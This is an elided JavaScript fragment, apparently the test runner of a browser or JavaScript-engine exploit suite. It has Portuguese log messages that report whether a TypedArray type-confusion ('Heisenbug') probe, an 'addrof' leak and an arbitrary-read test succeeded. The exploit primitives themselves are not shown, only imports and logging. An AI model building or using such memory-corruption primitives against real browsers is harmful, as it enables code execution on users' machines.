...
import {
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23, // <<<< NOME DA FUNÇÃO ATUALIZADO
...
async function runHeisenbugReproStrategy_TypedArrayVictim() {
    ...
    if (result.errorOccurred) {
        ...
        logS3(`  RUNNER R23: Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (arbReadTestResult) {
            logS3(`  RUNNER R23: Teste arb_read: ${arbReadTestResult.msg} (Endereço: ${arbReadTestResult.address_read}, Lido: ${arbReadTestResult.value_read})`, arbReadTestResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R23: Teste arb_read não produziu resultado.`, "warn", FNAME_RUNNER);
        }
        ...
        if(result.iteration_results_summary && result.iteration_results_summary.length > 0){
            logS3(`  RUNNER R23: Sumário completo das iterações:`, "info", FNAME_RUNNER);
...
export async function runAllAdvancedTestsS3() {
    ...
    logS3(`\n==== Script 3 R23 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
